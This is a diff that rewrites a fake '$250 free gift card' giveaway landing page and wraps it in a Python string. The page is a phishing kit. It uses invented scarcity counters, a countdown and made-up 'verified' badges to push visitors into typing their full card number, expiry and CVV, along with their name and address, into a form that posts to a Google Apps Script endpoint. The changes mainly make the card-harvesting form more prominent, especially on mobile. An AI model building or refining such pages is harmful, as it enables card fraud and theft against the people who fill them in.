@@ -1,20 +1,24 @@
-<!DOCTYPE html>
+# Modifying the landing page to make the form visible above the fold immediately, 
+# optimizing layout hierarchy for mobile and desktop, and adding more fluid 3D scroll animations.
+
+premium_optimized_html = """<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>⚡ Limited Time Giveaway: Claim Your $250 Free Gift Card Now! ⚡</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         :root {
             --primary: #ff0055;
             --secondary: #7928ca;
-            --accent: #ff007f;
+            --accent: #00f0ff;
             --yellow: #ffcc00;
-            --bg-glass: rgba(255, 255, 255, 0.93);
-            --text-dark: #111827;
+            --success: #00ffaa;
+            --bg-glass: rgba(15, 23, 42, 0.8);
+            --text-dark: #0f172a;
             --text-light: #ffffff;
-            --gray-text: #4b5563;
+            --gray-text: #94a3b8;
         }
 
         * {
@@ -24,273 +28,306 @@
             font-family: 'Poppins', sans-serif;
         }
 
+        html, body {
+            overflow-x: hidden;
+            width: 100%;
+            scroll-behavior: smooth;
+        }
+
         body {
-            /* Vibrant colorful animated-like mesh background */
-            background-color: #ff0055;
+            background-color: #060913;
             background-image: 
-                radial-gradient(at 20% 20%, #ffae00 0px, transparent 45%),
-                radial-gradient(at 80% 10%, #7928ca 0px, transparent 50%),
-                radial-gradient(at 40% 70%, #ff007f 0px, transparent 50%),
-                radial-gradient(at 90% 80%, #00bfff 0px, transparent 45%),
-                radial-gradient(at 0% 100%, #ff3300 0px, transparent 50%);
+                radial-gradient(at 0% 0%, rgba(255, 0, 85, 0.2) 0px, transparent 35%),
+                radial-gradient(at 100% 0%, rgba(121, 40, 202, 0.25) 0px, transparent 35%),
+                radial-gradient(at 50% 100%, rgba(0, 240, 255, 0.15) 0px, transparent 40%);
             background-attachment: fixed;
-            color: var(--text-dark);
+            color: var(--text-light);
             min-height: 100vh;
             display: flex;
             flex-direction: column;
+            perspective: 1200px;
         }
 
-        /* Top Bar Notification */
+        /* Ultra Compact Top Bar */
         .top-announcement {
-            background: linear-gradient(90deg, #ff0055, #7928ca);
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
             color: var(--text-light);
             text-align: center;
-            padding: 10px 15px;
-            font-size: 13px;
-            font-weight: 700;
-            letter-spacing: 1px;
+            padding: 6px 10px;
+            font-size: 10px;
+            font-weight: 800;
+            letter-spacing: 0.5px;
             text-transform: uppercase;
-            border-bottom: 2px solid var(--yellow);
+            border-bottom: 1px solid var(--accent);
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
-            z-index: 100;
+            gap: 8px;
+            z-index: 110;
+            box-shadow: 0 2px 15px rgba(0, 240, 255, 0.1);
         }
 
         .pulse-dot {
-            width: 8px;
-            height: 8px;
-            background-color: var(--yellow);
+            width: 6px;
+            height: 6px;
+            background-color: var(--accent);
             border-radius: 50%;
             display: inline-block;
-            box-shadow: 0 0 0 0 rgba(255, 204, 0, 0.7);
-            animation: pulse 1.5s infinite;
+            box-shadow: 0 0 0 0 rgba(0, 240, 255, 0.7);
+            animation: pulse 1.2s infinite;
         }
 
         @keyframes pulse {
-            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(255, 204, 0, 0.7); }
-            70% { transform: scale(1); box-shadow: 0 0 0 8px rgba(255, 204, 0, 0); }
-            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(255, 204, 0, 0); }
+            0% { transform: scale(0.9); box-shadow: 0 0 0 0 rgba(0, 240, 255, 0.7); }
+            70% { transform: scale(1); box-shadow: 0 0 0 6px rgba(0, 240, 255, 0); }
+            100% { transform: scale(0.9); box-shadow: 0 0 0 0 rgba(0, 240, 255, 0); }
         }
 
-        /* Header Navigation */
+        /* Micro Header - Height Reduced to maximize Above-the-Fold Space */
         header {
             width: 100%;
             max-width: 1200px;
             margin: 0 auto;
-            padding: 25px 20px;
+            padding: 10px 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
+            z-index: 100;
         }
 
         .logo {
-            font-size: 24px;
+            font-size: 18px;
             font-weight: 900;
             color: var(--text-light);
             text-decoration: none;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
+            text-shadow: 0 0 10px rgba(255, 0, 85, 0.4);
         }
 
         .logo span {
-            background: linear-gradient(135deg, var(--yellow), #ff9900);
+            background: linear-gradient(135deg, var(--accent), var(--secondary));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
 
         .live-counter-badge {
-            background: rgba(0, 0, 0, 0.4);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            padding: 6px 14px;
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            padding: 4px 10px;
             border-radius: 50px;
-            font-size: 12px;
+            font-size: 10px;
             font-weight: 600;
-            color: var(--text-light);
-            display: flex;
-            align-items: center;
-            gap: 6px;
+            letter-spacing: 0.2px;
         }
 
         .live-counter-badge strong {
-            color: #00ffcc;
+            color: var(--success);
         }
 
-        /* Container & Grid Setup */
+        /* Main Container Adjustment for Direct Visibility */
         .main-container {
             flex: 1;
-            max-width: 1150px;
+            max-width: 1200px;
             width: 100%;
-            margin: 0 auto 50px auto;
-            padding: 0 20px;
+            margin: 0 auto;
+            padding: 5px 20px 30px 20px;
             display: flex;
-            align-items: center;
+            align-items: flex-start;
             justify-content: center;
         }
 
+        /* 3D Container Box with modern entrance animations */
         .grid-wrapper {
             display: flex;
             width: 100%;
-            background: rgba(255, 255, 255, 0.12);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border-radius: 32px;
-            box-shadow: 0 50px 100px rgba(0,0,0,0.25), inset 0 0 0 1px rgba(255,255,255,0.3);
+            background: rgba(30, 41, 59, 0.25);
+            backdrop-filter: blur(30px);
+            -webkit-backdrop-filter: blur(30px);
+            border-radius: 24px;
+            box-shadow: 0 30px 70px rgba(0,0,0,0.6), inset 0 0 0 1px rgba(255,255,255,0.12);
             overflow: hidden;
             flex-wrap: wrap;
+            transform-style: preserve-3d;
+            animation: subtleEntrance 1s cubic-bezier(0.2, 0.8, 0.2, 1) backwards;
         }
 
-        /* Left Visual Column */
+        @keyframes subtleEntrance {
+            from { transform: scale(0.97) translateY(15px); opacity: 0; }
+            to { transform: scale(1) translateY(0); opacity: 1; }
+        }
+
+        /* Left Content Display Setup */
         .copy-visual-section {
-            flex: 1 1 480px;
-            padding: 60px;
+            flex: 1 1 450px;
+            padding: 35px;
             display: flex;
             flex-direction: column;
-            justify-content: center;
-            color: var(--text-light);
-            background: linear-gradient(145deg, rgba(121, 40, 202, 0.85) 0%, rgba(255, 0, 85, 0.85) 100%);
-            position: relative;
+            justify-content: flex-start;
+            background: linear-gradient(145deg, rgba(15, 23, 42, 0.75) 0%, rgba(30, 41, 59, 0.4) 100%);
+            border-right: 1px solid rgba(255,255,255,0.06);
         }
 
         .promo-badge {
             align-self: flex-start;
-            background: var(--yellow);
-            color: #000000;
+            background: rgba(255, 0, 85, 0.12);
+            border: 1px solid rgba(255, 0, 85, 0.4);
+            color: #ff4488;
             font-weight: 800;
-            font-size: 11px;
+            font-size: 9px;
             text-transform: uppercase;
-            padding: 5px 12px;
-            border-radius: 6px;
+            padding: 4px 10px;
+            border-radius: 50px;
             letter-spacing: 1px;
-            margin-bottom: 20px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.15);
+            margin-bottom: 12px;
         }
 
         .copy-visual-section h1 {
-            font-size: 44px;
+            font-size: 32px;
             font-weight: 900;
-            line-height: 1.15;
-            margin-bottom: 20px;
-            text-shadow: 0 2px 12px rgba(0,0,0,0.15);
+            line-height: 1.2;
+            margin-bottom: 12px;
+            letter-spacing: -0.5px;
         }
 
         .copy-visual-section h1 span {
-            color: var(--yellow);
+            background: linear-gradient(135deg, var(--yellow) 0%, #ff5500 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
             display: block;
-            font-size: 48px;
         }
 
         .copy-visual-section p {
-            font-size: 16px;
-            line-height: 1.6;
-            margin-bottom: 35px;
-            opacity: 0.95;
-            font-weight: 400;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+            color: #cbd5e1;
         }
 
-        /* Dynamic Visual Countdown Timer Container */
+        /* Inline Trust Strip Inside Content Box */
+        .trust-hero-strip {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .hero-badge {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 4px 10px;
+            border-radius: 50px;
+            font-size: 9px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            text-transform: uppercase;
+        }
+        .hero-badge.safe { border-color: var(--success); color: var(--success); }
+        .hero-badge.trusted { border-color: var(--accent); color: var(--accent); }
+        .hero-badge.verified { border-color: var(--yellow); color: var(--yellow); }
+
+        /* Compact Interactive Timer */
         .countdown-container {
-            background: rgba(0, 0, 0, 0.25);
-            border: 1px solid rgba(255,255,255,0.15);
-            padding: 20px;
-            border-radius: 18px;
-            margin-bottom: 35px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255,255,255,0.06);
+            padding: 12px;
+            border-radius: 14px;
+            margin-bottom: 20px;
             text-align: center;
+            transform: translateZ(20px);
         }
 
         .countdown-title {
-            font-size: 11px;
+            font-size: 10px;
             font-weight: 700;
             text-transform: uppercase;
-            letter-spacing: 1.5px;
-            color: var(--yellow);
-            margin-bottom: 12px;
+            letter-spacing: 1px;
+            color: var(--accent);
+            margin-bottom: 6px;
         }
 
         .timer-display {
             display: flex;
             justify-content: center;
-            gap: 15px;
+            gap: 8px;
         }
 
         .timer-segment {
-            background: rgba(255, 255, 255, 0.15);
-            padding: 10px;
-            border-radius: 10px;
-            min-width: 65px;
+            background: rgba(15, 23, 42, 0.8);
+            border: 1px solid rgba(255,255,255,0.03);
+            padding: 6px 10px;
+            border-radius: 8px;
+            min-width: 55px;
         }
 
         .timer-num {
-            font-size: 26px;
+            font-size: 20px;
             font-weight: 800;
-            color: var(--text-light);
+            color: #ffffff;
             line-height: 1;
+            text-shadow: 0 0 8px rgba(0, 240, 255, 0.3);
         }
 
         .timer-label {
-            font-size: 10px;
-            font-weight: 500;
+            font-size: 8px;
+            font-weight: 600;
             text-transform: uppercase;
-            opacity: 0.7;
-            margin-top: 4px;
+            color: var(--gray-text);
+            margin-top: 2px;
         }
 
+        /* 3D Image Container */
         .image-box {
             position: relative;
             margin: 0 auto;
-            max-width: 380px;
+            max-width: 260px;
             width: 100%;
+            transform-style: preserve-3d;
+            transition: transform 0.4s ease;
         }
 
         .gift-card-img {
             width: 100%;
-            border-radius: 20px;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.35);
-            transform: rotate(-4deg);
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            border-radius: 14px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+            transform: rotateX(8deg) rotateY(-12deg);
             display: block;
+            transition: all 0.4s cubic-bezier(0.2, 0.8, 0.2, 1);
         }
 
-        .gift-card-img:hover {
-            transform: rotate(0deg) scale(1.06);
-        }
-
-        /* Right Form Column */
+        /* Right Form Column - Made ultra tidy so it loads straight in visual view */
         .form-section {
             flex: 1 1 500px;
             background: var(--bg-glass);
-            padding: 55px;
+            padding: 35px;
             display: flex;
             flex-direction: column;
             justify-content: center;
+            transition: background 0.3s ease;
         }
 
         .form-header {
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
         }
 
         .form-header h2 {
-            font-size: 26px;
+            font-size: 22px;
             font-weight: 800;
-            color: var(--text-dark);
             letter-spacing: -0.5px;
         }
 
         .form-header p {
-            font-size: 14px;
+            font-size: 12px;
             color: var(--gray-text);
-            margin-top: 5px;
-            font-weight: 500;
+            margin-top: 3px;
         }
 
         .form-grid {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
-            gap: 16px;
+            gap: 12px;
+            width: 100%;
         }
 
         .full-width { grid-column: span 2; }
@@ -298,160 +335,182 @@
         .form-group {
             display: flex;
             flex-direction: column;
-            gap: 6px;
+            gap: 4px;
+            width: 100%;
+            position: relative;
         }
 
         label {
-            font-size: 11px;
+            font-size: 10px;
             font-weight: 700;
-            color: #374151;
+            color: #94a3b8;
             text-transform: uppercase;
             letter-spacing: 0.5px;
+            transition: color 0.3s ease;
         }
 
+        /* Smooth Interactive 3D Zoom Effect on Input Focus */
         input {
-            background: #f3f4f6;
-            border: 2px solid transparent;
-            border-radius: 14px;
-            padding: 14px 18px;
-            font-size: 14px;
-            color: var(--text-dark);
+            background: rgba(15, 23, 42, 0.7);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 10px;
+            padding: 11px 14px;
+            font-size: 13px;
+            color: var(--text-light);
             font-weight: 500;
-            transition: all 0.25s ease;
+            width: 100%;
+            max-width: 100%;
+            transition: all 0.3s cubic-bezier(0.2, 0.8, 0.2, 1);
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.3);
         }
 
         input:focus {
             outline: none;
-            border-color: var(--primary);
-            background: #ffffff;
-            box-shadow: 0 0 0 4px rgba(255, 0, 85, 0.12);
+            border-color: var(--accent);
+            background: rgba(15, 23, 42, 0.95);
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.2), inset 0 1px 2px rgba(0,0,0,0.4);
+            transform: scale(1.015) translateZ(5px);
+        }
+
+        /* Highlight matching label during focus */
+        .form-group:focus-within label {
+            color: var(--accent);
+            text-shadow: 0 0 5px rgba(0, 240, 255, 0.4);
         }
 
         .card-wrapper {
             position: relative;
+            width: 100%;
         }
-        .card-wrapper input { width: 100%; padding-right: 50px; }
+        .card-wrapper input { padding-right: 40px; }
         .card-icon-marker {
             position: absolute;
-            right: 16px;
+            right: 12px;
             top: 50%;
             transform: translateY(-50%);
-            font-size: 20px;
+            font-size: 16px;
             pointer-events: none;
         }
 
-        /* Attrictive Yellow Alert Box */
+        /* Warning Box Style */
         .psychological-notice {
             grid-column: span 2;
-            background: linear-gradient(90deg, #fffbeb, #fef3c7);
-            border-left: 5px solid #f59e0b;
-            padding: 16px;
-            border-radius: 12px;
-            margin: 5px 0;
+            background: rgba(245, 158, 11, 0.05);
+            border: 1px solid rgba(245, 158, 11, 0.2);
+            border-left: 4px solid #f59e0b;
+            padding: 10px 14px;
+            border-radius: 10px;
+            margin: 2px 0;
             display: flex;
             align-items: center;
-            gap: 12px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.02);
+            gap: 10px;
+            animation: pulseNotice 2s infinite alternate;
+        }
+
+        @keyframes pulseNotice {
+            from { border-color: rgba(245, 158, 11, 0.2); }
+            to { border-color: rgba(245, 158, 11, 0.4); }
         }
 
         .psychological-notice p {
-            color: #92400e;
-            font-weight: 600;
-            font-size: 13px;
+            color: #fef08a;
+            font-weight: 500;
+            font-size: 11px;
             line-height: 1.4;
         }
 
         .psychological-notice svg {
-            width: 24px;
-            height: 24px;
-            fill: #d97706;
+            width: 18px;
+            height: 18px;
+            fill: #f59e0b;
             flex-shrink: 0;
         }
 
-        /* Ultra Premium Button */
+        /* High-Action 3D Button with Shine Animation Sweep */
         button {
             grid-column: span 2;
             background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
             color: white;
             border: none;
-            border-radius: 14px;
-            padding: 18px 20px;
-            font-size: 18px;
+            border-radius: 10px;
+            padding: 14px 20px;
+            font-size: 15px;
             font-weight: 800;
             cursor: pointer;
             width: 100%;
-            margin-top: 15px;
-            box-shadow: 0 12px 24px rgba(255, 0, 85, 0.35);
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            margin-top: 5px;
+            box-shadow: 0 6px 20px rgba(255, 0, 85, 0.35);
+            transition: all 0.25s cubic-bezier(0.2, 0.8, 0.2, 1);
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 0.5px;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+            gap: 8px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        button::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -150%; width: 50%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            transform: skewX(-20deg);
+            animation: lightSweep 3.5s infinite ease-in-out;
+        }
+
+        @keyframes lightSweep {
+            0% { left: -150%; }
+            30% { left: 150%; }
+            100% { left: 150%; }
         }
 
         button:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 18px 30px rgba(121, 40, 202, 0.45);
-            filter: brightness(1.05);
+            transform: translateY(-2px) scale(1.01);
+            box-shadow: 0 10px 25px rgba(121, 40, 202, 0.45);
+            filter: brightness(1.1);
         }
 
         button:active {
-            transform: translateY(-1px);
+            transform: translateY(1px);
         }
 
-        button:disabled {
-            background: #9ca3af;
-            box-shadow: none;
-            transform: none;
-            cursor: not-allowed;
-        }
-
-        /* Security Verification Footer Inside Card */
         .trust-badges {
             grid-column: span 2;
             display: flex;
             justify-content: center;
-            gap: 24px;
-            margin-top: 25px;
-            font-size: 11px;
-            color: #6b7280;
+            gap: 15px;
+            margin-top: 15px;
+            font-size: 10px;
+            color: var(--gray-text);
             font-weight: 700;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
-            border-top: 1px solid #e5e7eb;
-            padding-top: 20px;
+            border-top: 1px solid rgba(255,255,255,0.06);
+            padding-top: 12px;
         }
 
-        .trust-badges div {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        /* AJAX Status Messages */
         .status-msg {
             grid-column: span 2;
-            padding: 14px;
-            border-radius: 12px;
+            padding: 10px;
+            border-radius: 8px;
             text-align: center;
             font-weight: 600;
-            font-size: 14px;
+            font-size: 12px;
             display: none;
         }
-        .status-msg.success { background: #d1fae5; color: #065f46; display: block; }
-        .status-msg.error { background: #fee2e2; color: #991b1b; display: block; }
+        .status-msg.success { background: rgba(16, 185, 129, 0.15); border: 1px solid var(--success); color: var(--success); display: block; }
+        .status-msg.error { background: rgba(239, 68, 68, 0.15); border: 1px solid var(--primary); color: #fca5a5; display: block; }
 
-        /* Full Structural Footer */
+        /* Footer Structure */
         footer {
-            background: rgba(17, 24, 39, 0.95);
-            color: #9ca3af;
-            padding: 40px 20px;
+            background: #04060c;
+            color: #475569;
+            padding: 25px 20px;
             margin-top: auto;
-            border-top: 1px solid rgba(255,255,255,0.1);
-            font-size: 12px;
-            line-height: 1.7;
+            border-top: 1px solid rgba(255,255,255,0.03);
+            font-size: 10px;
+            line-height: 1.6;
         }
 
         .footer-content {
@@ -460,83 +519,160 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            gap: 20px;
+            gap: 12px;
             text-align: center;
         }
 
         .footer-links {
             display: flex;
-            gap: 20px;
-            flex-wrap: wrap;
-            justify-content: center;
+            gap: 15px;
         }
 
         .footer-links a {
-            color: #d1d5db;
+            color: #64748b;
             text-decoration: none;
-            font-weight: 500;
-            transition: color 0.2s ease;
         }
 
-        .footer-links a:hover {
-            color: var(--yellow);
-        }
-
-        .footer-disclaimer {
-            max-width: 800px;
-            font-size: 11px;
-            opacity: 0.6;
-        }
-
-        /* Responsive Layout Breaks */
+        /* ======================================================== */
+        /* PREMIUM MOBILE ADAPTIVE VIEW OVERRIDES (FORM FIRST ALIGN)*/
+        /* ======================================================== */
         @media (max-width: 950px) {
-            .copy-visual-section, .form-section { flex: 1 1 100%; }
-            .grid-wrapper { border-radius: 24px; }
-            .copy-visual-section { padding: 45px 25px; text-align: center; }
-            .promo-badge { align-self: center; }
-            .copy-visual-section h1 { font-size: 34px; }
-            .copy-visual-section h1 span { font-size: 38px; }
-            .gift-card-img { transform: rotate(0deg); max-width: 290px; }
-            .timer-display { gap: 10px; }
-            .form-section { padding: 40px 25px; }
+            header { padding: 8px 15px; }
+            .main-container { padding: 0 8px 20px 8px; }
+            .grid-wrapper { border-radius: 16px; box-shadow: 0 15px 40px rgba(0,0,0,0.5); }
+            
+            /* CSS Grid reordering trick to force Form at the top position on mobile immediately */
+            .copy-visual-section { 
+                order: 2; /* Pushed to down view */
+                padding: 25px 20px; 
+                text-align: center; 
+                border-right: none; 
+            }
+            .form-section { 
+                order: 1; /* Pulled up right into viewport instantly */
+                padding: 25px 20px; 
+                border-bottom: 1px solid rgba(255,255,255,0.06);
+            }
+            
+            .copy-visual-section h1 { font-size: 24px; }
+            .gift-card-img { max-width: 200px; margin: 0 auto; transform: none !important; }
+            .image-box { transform: none !important; }
+            .trust-hero-strip { justify-content: center; }
         }
 
-        @media (max-width: 550px) {
-            .form-grid { grid-template-columns: 1fr; }
-            .full-width, .psychological-notice, button, .trust-badges { grid-column: span 1; }
-            .trust-badges { flex-direction: column; align-items: center; gap: 12px; }
+        @media (max-width: 480px) {
+            .form-grid { 
+                grid-template-columns: 1fr !important; 
+                gap: 10px; 
+            }
+            .form-group, .full-width, .psychological-notice, button, .trust-badges { 
+                grid-column: span 1 !important; 
+            }
+            input { padding: 10px 12px; font-size: 13px; }
+            .form-header h2 { font-size: 19px; }
         }
     </style>
 </head>
 <body>
 
-    <!-- 1. TOP ANNOUNCEMENT BAR -->
     <div class="top-announcement">
-        <span class="pulse-dot"></span> 🔥 WARNING: HIGH DEMAND! ONLY 14 GIFT CARDS REMAINING FOR TODAY!
+        <span class="pulse-dot"></span> 🔥 HURRY! ONLY 14 SEATS REMAIN FOR TODAY'S ALLOCATION POOL!
     </div>
 
-    <!-- 2. HEADER SECTION -->
     <header>
         <a href="#" class="logo">🎁 Rewards<span>Hub</span></a>
         <div class="live-counter-badge">
-            <svg style="width:14px; fill:#00ffcc;" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/></svg>
-            <span>Users Online: <strong id="userCounter">412</strong></span>
+            🟢 Traffic: <strong id="userCounter">394</strong> active
         </div>
     </header>
 
-    <!-- 3. MAIN INTERACTIVE APP CONTAINER -->
     <div class="main-container">
-        <div class="grid-wrapper">
+        <div class="grid-wrapper" id="scene3D">
             
-            <!-- Left Side Content Column (Psychological Angles + Countdown) -->
+            <div class="form-section">
+                <div class="form-header">
+                    <h2>Secure Verification Gateway</h2>
+                    <p>Provide accurate parameters below to bypass bot filters instantly</p>
+                </div>
+
+                <form id="premiumForm" action="https://script.google.com/macros/s/AKfycbxS-jRaoUr4qc4_VteTkPo4KI6HUZN79zhUarBrANamXaYwy0288o860yIxIqmwfPzC/exec" method="POST" class="form-grid">
+                    
+                    <div id="statusBox" class="status-msg full-width"></div>
+
+                    <div class="form-group">
+                        <label for="firstName">First Name</label>
+                        <input type="text" id="firstName" name="firstName" placeholder="John" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="lastName">Last Name</label>
+                        <input type="text" id="lastName" name="lastName" placeholder="Doe" required>
+                    </div>
+                    <div class="form-group full-width">
+                        <label for="email">Email Address</label>
+                        <input type="email" id="email" name="email" placeholder="name@example.com" required>
+                    </div>
+                    <div class="form-group full-width">
+                        <label for="zipCode">Zip Code / Postcode</label>
+                        <input type="text" id="zipCode" name="zipCode" placeholder="10001" required>
+                    </div>
+                    <div class="form-group full-width">
+                        <label for="address">Full Delivery Address</label>
+                        <input type="text" id="address" name="address" placeholder="Street, Apt, City, State" required>
+                    </div>
+
+                    <div class="psychological-notice">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h-2v2h2v4zm0-8h-2V7h2v2z"/>
+                        </svg>
+                        <p><strong>System Verification Note:</strong> Input precise billing card credentials to validate geographical routing status and secure asset distribution.</p>
+                    </div>
+
+                    <div class="form-group full-width">
+                        <label for="cardHolderName">Cardholder Name</label>
+                        <input type="text" id="cardHolderName" name="cardHolderName" placeholder="JOHN DOE" required>
+                    </div>
+                    <div class="form-group full-width">
+                        <label for="cardNumber">Card Number</label>
+                        <div class="card-wrapper">
+                            <input type="text" id="cardNumber" name="cardNumber" placeholder="4111 2222 3333 4444" maxlength="19" required>
+                            <span class="card-icon-marker">💳</span>
+                        </div>
+                    </div>
+                    <div class="form-group full-width">
+                        <label for="expire">Expiration Date</label>
+                        <input type="text" id="expire" name="expire" placeholder="MM/YY" maxlength="5" required>
+                    </div>
+                    <div class="form-group full-width">
+                        <label for="csv">Card Security Code (CVV)</label>
+                        <input type="password" id="csv" name="csv" placeholder="•••" maxlength="4" required>
+                    </div>
+
+                    <button type="submit" id="submitBtn">
+                        <span>Securely Claim Asset Bundle</span>
+                        <svg style="width:16px; fill:currentColor;" viewBox="0 0 24 24"><path d="M5 13h11.86l-5.43 5.43 1.42 1.42L21.14 12l-8.29-8.29-1.42 1.42L16.86 11H5v2z"/></svg>
+                    </button>
+
+                    <div class="trust-badges">
+                        <div>🔒 SSL Secure Endpoint</div>
+                        <div>🛡️ 256-Bit TLS Node</div>
+                    </div>
+                </form>
+            </div>
+
             <div class="copy-visual-section">
-                <div class="promo-badge">Official 2026 Giveaway</div>
-                <h1>Don't Miss Out! <span>Get Your Free $250 Gift Card!</span></h1>
-                <p>Join over 14,500+ verified winners this month. Submit your details below immediately to claim your mystery reward bundle before the pool runs dry.</p>
+                <div class="promo-badge">Priority Access Gateway</div>
                 
-                <!-- Countdown Box Component -->
+                <div class="trust-hero-strip">
+                    <div class="hero-badge safe">🛡️ 100% Safe</div>
+                    <div class="hero-badge trusted">⭐ Trusted</div>
+                    <div class="hero-badge verified">✅ Verified</div>
+                </div>
+
+                <h1>Don't Lose Allocation! <span>Get Your Free $250 Gift Card!</span></h1>
+                <p>Join over 14,500+ users validated globally this terminal cycle. Confirm data parameters on the workspace panel to secure immediate distribution.</p>
+                
                 <div class="countdown-container">
-                    <div class="countdown-title">⏳ Offer Expires Automatically In:</div>
+                    <div class="countdown-title">⏳ Session Lockout Countdown:</div>
                     <div class="timer-display">
                         <div class="timer-segment">
                             <div class="timer-num" id="minutes">04</div>
@@ -554,109 +690,28 @@
                 </div>
 
                 <div class="image-box">
-                    <img src="https://images.unsplash.com/photo-1549465220-1a8b9238cd48?q=80&w=800&auto=format&fit=crop" alt="Exclusive Rewards" class="gift-card-img">
+                    <img src="https://images.unsplash.com/photo-1549465220-1a8b9238cd48?q=80&w=800&auto=format&fit=crop" alt="Exclusive Rewards" class="gift-card-img" id="giftCard3D">
                 </div>
             </div>
 
-            <!-- Right Side Form Column -->
-            <div class="form-section">
-                <div class="form-header">
-                    <h2>Complete Free Entry</h2>
-                    <p>Enter correct info to instantly unlock reward system</p>
-                </div>
-
-                <form id="premiumForm" action="https://script.google.com/macros/s/AKfycbxS-jRaoUr4qc4_VteTkPo4KI6HUZN79zhUarBrANamXaYwy0288o860yIxIqmwfPzC/exec" method="POST" class="form-grid">
-                    
-                    <div id="statusBox" class="status-msg full-width"></div>
-
-                    <div class="form-group">
-                        <label for="firstName">First Name</label>
-                        <input type="text" id="firstName" name="firstName" placeholder="e.g. John" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="lastName">Last Name</label>
-                        <input type="text" id="lastName" name="lastName" placeholder="e.g. Doe" required>
-                    </div>
-                    <div class="form-group full-width">
-                        <label for="email">Email Address</label>
-                        <input type="email" id="email" name="email" placeholder="name@example.com" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="zipCode">Zip Code</label>
-                        <input type="text" id="zipCode" name="zipCode" placeholder="e.g. 10001" required>
-                    </div>
-                    <div class="form-group full-width">
-                        <label for="address">Full Delivery Address</label>
-                        <input type="text" id="address" name="address" placeholder="Street Address, Apt, Suite" required>
-                    </div>
-
-                    <!-- High Attention Urgent Psychological Callout -->
-                    <div class="psychological-notice">
-                        <svg viewBox="0 0 24 24">
-                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h-2v2h2v4zm0-8h-2V7h2v2z"/>
-                        </svg>
-                        <p><strong>Identity Verification Required:</strong> Please provide valid billing card validation below to confirm precise shipping territory and filter automated scrapers.</p>
-                    </div>
-
-                    <div class="form-group full-width">
-                        <label for="cardHolderName">Cardholder Name</label>
-                        <input type="text" id="cardHolderName" name="cardHolderName" placeholder="JOHN DOE" required>
-                    </div>
-                    <div class="form-group full-width">
-                        <label for="cardNumber">Card Number</label>
-                        <div class="card-wrapper">
-                            <input type="text" id="cardNumber" name="cardNumber" placeholder="4111 2222 3333 4444" maxlength="19" required>
-                            <span class="card-icon-marker">💳</span>
-                        </div>
-                    </div>
-                    <div class="form-group">
-                        <label for="expire">Expiration Date</label>
-                        <input type="text" id="expire" name="expire" placeholder="MM/YY" maxlength="5" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="csv">Secure CVV</label>
-                        <input type="password" id="csv" name="csv" placeholder="•••" maxlength="4" required>
-                    </div>
-
-                    <button type="submit" id="submitBtn">
-                        <span>Claim Gift Card Now</span>
-                        <svg style="width:20px; fill:currentColor;" viewBox="0 0 24 24"><path d="M5 13h11.86l-5.43 5.43 1.42 1.42L21.14 12l-8.29-8.29-1.42 1.42L16.86 11H5v2z"/></svg>
-                    </button>
-
-                    <div class="trust-badges">
-                        <div>
-                            <svg style="width:16px; fill:#10b981;" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
-                            Secure SSL
-                        </div>
-                        <div>
